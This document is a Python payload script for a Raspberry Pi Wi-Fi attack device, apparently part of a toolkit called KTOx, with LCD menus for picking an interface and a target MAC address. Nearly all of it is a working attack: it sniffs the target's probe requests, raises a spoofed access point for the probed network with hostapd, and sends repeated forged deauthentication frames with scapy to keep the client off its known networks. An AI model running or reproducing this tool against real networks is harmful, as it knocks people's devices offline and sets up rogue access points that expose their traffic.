#!/usr/bin/env python3
import json
"""
KTOx *payload* – **Deauth Known Networks**
=============================================
This payload targets a specific client MAC address and attempts to deauthenticate
it from any Wi-Fi network it tries to connect to, based on probe requests.
When the client probes for a known network, the payload spoofs that network
and deauthenticates the client, effectively preventing it from connecting
to its preferred networks.

Features:
- Interactive UI for selecting the wireless interface.
- Activates monitor mode on the selected interface.
- Allows configuration of the target client MAC address.
- Sniffs for probe requests from the target client.
- Spoofs the probed network and sends deauthentication frames.
- Displays status messages on the LCD.
- Graceful exit via KEY3 or Ctrl-C, deactivating monitor mode.

Controls:
- INTERFACE SELECTION SCREEN:
    - UP/DOWN: Navigate available wireless interfaces.
    - OK: Select interface and activate monitor mode.
    - KEY3: Cancel selection and exit.
- MAIN CONFIGURATION SCREEN:
    - UP/DOWN: Navigate configuration parameters (Target Client MAC).
    - OK: Edit selected parameter.
    - KEY2: Start attack.
    - KEY3: Exit Payload.
- MAC INPUT SCREEN:
    - UP/DOWN: Change character at cursor position.
    - LEFT/RIGHT: Move cursor.
    - OK: Confirm MAC.
    - KEY3: Cancel input.
"""
import sys
import os
import time
import signal
import subprocess
import threading
# Prefer installed KTOx for imports, keep repo parent for local helper fallback
if os.path.isdir('/root/KTOx') and '/root/KTOx' not in sys.path:
    sys.path.insert(0, '/root/KTOx')
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..')))
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))) # Add parent directory for monitor_mode_helper

import RPi.GPIO as GPIO
import LCD_Config
import LCD_1in44
from PIL import Image, ImageDraw, ImageFont
from scapy.all import *
conf.verb = 0
from wifi.ktox_integration import get_available_interfaces
import re
import monitor_mode_helper

WIFI_INTERFACE = None
ORIGINAL_WIFI_INTERFACE = None
TARGET_CLIENT_MAC = "AA:BB:CC:DD:EE:FF"
KTOX_ROOT = '/root/KTOx' if os.path.isdir('/root/KTOx') else os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..'))
LOOT_DIR = os.path.join(KTOX_ROOT, "loot", "Handshakes")
# Ensure loot directory exists
try:
    os.makedirs(LOOT_DIR, exist_ok=True)
except Exception:
    pass

# Load PINS from KTOx gui_conf.json
PINS = {"UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16}
try:
    import json
    def _find_gui_conf():
        candidates = [
            os.path.join(os.getcwd(), 'gui_conf.json'),
            os.path.join('/root/KTOx', 'gui_conf.json'),
            os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'KTOx', 'gui_conf.json'),
        ]
        for sp in sys.path:
            try:
                if sp and os.path.basename(sp) == 'KTOx':
                    candidates.append(os.path.join(sp, 'gui_conf.json'))
            except Exception:
                pass
        for p in candidates:
            if os.path.exists(p):
                return p
        return None
    conf_path = _find_gui_conf()
    if conf_path:
        with open(conf_path, 'r') as f:
            data = json.load(f)
        conf_pins = data.get("PINS", {})
        PINS = {
            "UP": conf_pins.get("KEY_UP_PIN", PINS["UP"]),
            "DOWN": conf_pins.get("KEY_DOWN_PIN", PINS["DOWN"]),
            "LEFT": conf_pins.get("KEY_LEFT_PIN", PINS["LEFT"]),
            "RIGHT": conf_pins.get("KEY_RIGHT_PIN", PINS["RIGHT"]),
            "OK": conf_pins.get("KEY_PRESS_PIN", PINS["OK"]),
            "KEY1": conf_pins.get("KEY1_PIN", PINS["KEY1"]),
            "KEY2": conf_pins.get("KEY2_PIN", PINS["KEY2"]),
            "KEY3": conf_pins.get("KEY3_PIN", PINS["KEY3"]),
        }
except Exception:
    pass
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT = ImageFont.load_default()

running = True
status_msg = "Press OK to start"
probed_ssid = None
attack_procs = {}
# wifi_manager = WiFiManager() # No longer needed for monitor mode

# --- Local Monitor Mode Functions ---


def cleanup(*_):
    global running, WIFI_INTERFACE, ORIGINAL_WIFI_INTERFACE
    running = False
    for proc in attack_procs.values():
        try:
            os.killpg(proc.pid, signal.SIGTERM)
        except Exception:
            try:
                os.kill(proc.pid, signal.SIGTERM)
            except Exception:
                pass
    
    if WIFI_INTERFACE: # Check if monitor mode was ever activated
        print(f"Attempting to deactivate monitor mode on {WIFI_INTERFACE}...", file=sys.stderr)
        success = monitor_mode_helper.deactivate_monitor_mode(WIFI_INTERFACE)
        if success:
            print(f"Successfully deactivated monitor mode on {WIFI_INTERFACE}", file=sys.stderr)
        else:
            print(f"ERROR: Failed to deactivate monitor mode on {WIFI_INTERFACE}", file=sys.stderr)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def draw_message(lines, color="yellow"):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    y = 40
    for line in lines:
        bbox = d.textbbox((0, 0), line, font=FONT_TITLE)
        w = bbox[2] - bbox[0]
        x = (WIDTH - w) // 2
        d.text((x, y), line, font=FONT_TITLE, fill=color)
        y += 15
    LCD.LCD_ShowImage(img, 0, 0)

def draw_ui_main(params, selected_index):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "Known Net Deauth", font=FONT_TITLE, fill="#FFC300")
    d.line([(0, 22), (128, 22)], fill="#FFC300", width=1)

    y_pos = 25
    param_keys = list(params.keys())
    for i, key in enumerate(param_keys):
        color = "yellow" if i == selected_index else "white"
        d.text((5, y_pos), f"{key}: {params[key]}", font=FONT, fill=color)
        y_pos += 11
    
    d.text((5, 80), status_msg, font=FONT, fill="yellow")
    if probed_ssid:
        d.text((5, 95), f"Probed: {probed_ssid}", font=FONT, fill="lime")
    d.text((5, 115), "OK=Edit | KEY2=Start | KEY3=Exit", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

def draw_ui_interface_selection(interfaces, current_selection):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "Select Interface", font=FONT_TITLE, fill="cyan")
    d.line([(0, 22), (128, 22)], fill="cyan", width=1)

    y_pos = 25
    for i, iface in enumerate(interfaces):
        color = "yellow" if i == current_selection else "white"
        d.text((5, y_pos), iface, font=FONT, fill=color)
        y_pos += 11
    
    d.text((5, 115), "UP/DOWN=Select | OK=Confirm", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

def select_interface_menu():
    global WIFI_INTERFACE, ORIGINAL_WIFI_INTERFACE, status_msg
    
    available_interfaces = [iface for iface in get_available_interfaces() if iface.startswith('wlan')]
    # Prefer wlan1 if present
    if 'wlan1' in available_interfaces:
        available_interfaces.remove('wlan1')
        available_interfaces.insert(0, 'wlan1')
    if not available_interfaces:
        draw_message(["No WiFi interfaces found!"], "red")
        time.sleep(3)
        return False

    current_menu_selection = 0
    last_button_press_time = 0
    BUTTON_DEBOUNCE_TIME = 0.2 # seconds

    while running:
        current_time = time.time()
        draw_ui_interface_selection(available_interfaces, current_menu_selection)
        
        if GPIO.input(PINS["UP"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
            last_button_press_time = current_time
            current_menu_selection = (current_menu_selection - 1 + len(available_interfaces)) % len(available_interfaces)
            time.sleep(BUTTON_DEBOUNCE_TIME)
        elif GPIO.input(PINS["DOWN"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
            last_button_press_time = current_time
            current_menu_selection = (current_menu_selection + 1) % len(available_interfaces)
            time.sleep(BUTTON_DEBOUNCE_TIME)
        elif GPIO.input(PINS["OK"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
            last_button_press_time = current_time
            selected_iface = available_interfaces[current_menu_selection]
            draw_message([f"Activating monitor", f"mode on {selected_iface}..."], "yellow")
            print(f"Attempting to activate monitor mode on {selected_iface}...", file=sys.stderr)
            
            ORIGINAL_WIFI_INTERFACE = selected_iface # Store original interface before activation
            monitor_iface = monitor_mode_helper.activate_monitor_mode(selected_iface)
            if monitor_iface:
                WIFI_INTERFACE = monitor_iface
                draw_message([f"Monitor mode active", f"on {WIFI_INTERFACE}"], "lime")
                print(f"Successfully activated monitor mode on {WIFI_INTERFACE}", file=sys.stderr)
                time.sleep(2)
                return True
            else:
                # Display a more informative error if activation fails
                draw_message(["ERROR:", "Monitor mode failed!", "Check stderr for details."], "red")
                print(f"ERROR: monitor_mode_helper.activate_monitor_mode failed for {selected_iface}. See stderr for details from helper.", file=sys.stderr)
                time.sleep(3)
                return False
        elif GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
            last_button_press_time = current_time
            return False
        
        time.sleep(0.05)

def handle_mac_input_logic(initial_mac):
    global current_mac_input, mac_input_cursor_pos
    current_mac_input = initial_mac
    mac_input_cursor_pos = len(initial_mac) - 1
    
    char_set = "0123456789abcdef:"
    
    while running:
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ImageDraw.Draw(img)
        d.text((5, 5), "Enter Target MAC:", font=FONT_TITLE, fill="cyan")
        d.line([(0, 22), (128, 22)], fill="cyan", width=1)

        display_text = list(current_mac_input)
        if mac_input_cursor_pos < len(display_text):
            display_text[mac_input_cursor_pos] = '_'
        d.text((5, 40), "".join(display_text[:17]), font=FONT_TITLE, fill="yellow")
        d.text((5, 115), "UP/DOWN=Char | LEFT/RIGHT=Move | OK=Confirm", font=FONT, fill="cyan")
        LCD.LCD_ShowImage(img, 0, 0)

        last_button_press_time = 0
        BUTTON_DEBOUNCE_TIME = 0.2 # seconds
        current_time = time.time()

        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                btn = name
                last_button_press_time = current_time
                break
        
        if btn == "KEY3":
            return None
        
        if btn == "OK":
            if len(current_mac_input) == 17 and all(c in char_set for c in current_mac_input):
                return current_mac_input
            else:
                draw_message(["Invalid MAC!", "Try again."], "red")
                time.sleep(2)
                current_mac_input = initial_mac
                mac_input_cursor_pos = len(initial_mac) - 1
        
        if btn == "LEFT":
            mac_input_cursor_pos = max(0, mac_input_cursor_pos - 1)
        elif btn == "RIGHT":
            mac_input_cursor_pos = min(len(current_mac_input), mac_input_cursor_pos + 1)
        elif btn == "UP" or btn == "DOWN":
            if mac_input_cursor_pos < len(current_mac_input):
                char_list = list(current_mac_input)
                current_char = char_list[mac_input_cursor_pos]
                
                try:
                    char_index = char_set.index(current_char)
                    if btn == "UP":
                        char_index = (char_index + 1) % len(char_set)
                    else:
                        char_index = (char_index - 1 + len(char_set)) % len(char_set)
                    char_list[mac_input_cursor_pos] = char_set[char_index]
                    current_mac_input = "".join(char_list)
                except ValueError:
                    char_list[mac_input_cursor_pos] = char_set[0]
                    current_mac_input = "".join(char_list)
        
        time.sleep(0.05)
    return None

def packet_handler(pkt):
    global probed_ssid, status_msg
    if pkt.haslayer(Dot11ProbeReq) and pkt.addr2.lower() == TARGET_CLIENT_MAC.lower():
        ssid = pkt.info.decode()
        if ssid:
            probed_ssid = ssid
            status_msg = "SSID Found! Starting..."
            raise StopIteration

def run_attack():
    global status_msg, probed_ssid
    
    status_msg = "Sniffing probes..."
    probed_ssid = None
    try:
        sniff(iface=WIFI_INTERFACE, prn=packet_handler, timeout=60)
    except StopIteration:
        pass

    if not probed_ssid:
        status_msg = "No probes found."
        return

    # Create a minimal hostapd config to spoof the probed SSID
    temp_dir = "/tmp/ktox_known_deauth"
    os.makedirs(temp_dir, exist_ok=True)
    hostapd_conf_path = os.path.join(temp_dir, "hostapd.conf")
    with open(hostapd_conf_path, "w") as f:
        f.write(f"interface={WIFI_INTERFACE}\n")
        f.write("driver=nl80211\n")
        f.write(f"ssid={probed_ssid}\n")
        f.write("hw_mode=g\n")
        f.write("channel=6\n")

    attack_procs['hostapd'] = subprocess.Popen(["hostapd", hostapd_conf_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
    time.sleep(2)

    status_msg = f"Deauthing {TARGET_CLIENT_MAC}"
    ap_bssid = RandMAC()
    deauth_pkt = RadioTap()/Dot11(type=0, subtype=12, addr1=TARGET_CLIENT_MAC, addr2=ap_bssid, addr3=ap_bssid)/Dot11Deauth(reason=7)
    
    end_time = time.time() + 30
    while time.time() < end_time and running:
        sendp(deauth_pkt, iface=WIFI_INTERFACE, count=10, inter=0.1, verbose=0)
        time.sleep(1)
        
    status_msg = "Attack finished."

if __name__ == '__main__':
    current_screen = "interface_select"
    selected_param_index = 0
    params = {
        "Target MAC": TARGET_CLIENT_MAC
    }
    param_keys = list(params.keys())
    
    try:
        for cmd in ["hostapd"]:
            if subprocess.run(f"which {cmd}", shell=True, capture_output=True).returncode != 0:
                draw_message([f"{cmd} not found!"], "red")
                time.sleep(3)
                raise SystemExit(f"{cmd} not found.")

        if not select_interface_menu():
            draw_message(["No interface selected", "or monitor mode failed."], "red")
            time.sleep(3)
            raise SystemExit("No interface selected or monitor mode failed.")
        
        current_screen = "main_config"
        last_button_press_time = 0
        BUTTON_DEBOUNCE_TIME = 0.3 # seconds

        while running:
            current_time = time.time()
            if current_screen == "main_config":
                draw_ui_main(params, selected_param_index)
                
                if GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    cleanup()
                    break
                
                if GPIO.input(PINS["UP"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    selected_param_index = (selected_param_index - 1) % len(param_keys)
                    time.sleep(BUTTON_DEBOUNCE_TIME)
                elif GPIO.input(PINS["DOWN"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    selected_param_index = (selected_param_index + 1) % len(param_keys)
                    time.sleep(BUTTON_DEBOUNCE_TIME)
                elif GPIO.input(PINS["OK"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    key = param_keys[selected_param_index]
                    if key == "Target MAC":
                        char_set = "0123456789abcdef:"
                        new_mac = handle_mac_input_logic(params[key])
                        if new_mac:
                            params[key] = new_mac
                            TARGET_CLIENT_MAC = new_mac
                    time.sleep(BUTTON_DEBOUNCE_TIME)
                elif GPIO.input(PINS["KEY2"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    threading.Thread(target=run_attack, daemon=True).start()
                    time.sleep(BUTTON_DEBOUNCE_TIME)
                    while status_msg not in ["No probes found.", "Attack finished."]:
                        if GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                            last_button_press_time = current_time
                            cleanup()
                            break
                        time.sleep(0.1)
            
            time.sleep(0.05)

    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        cleanup()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("Known Networks Deauth payload finished.")
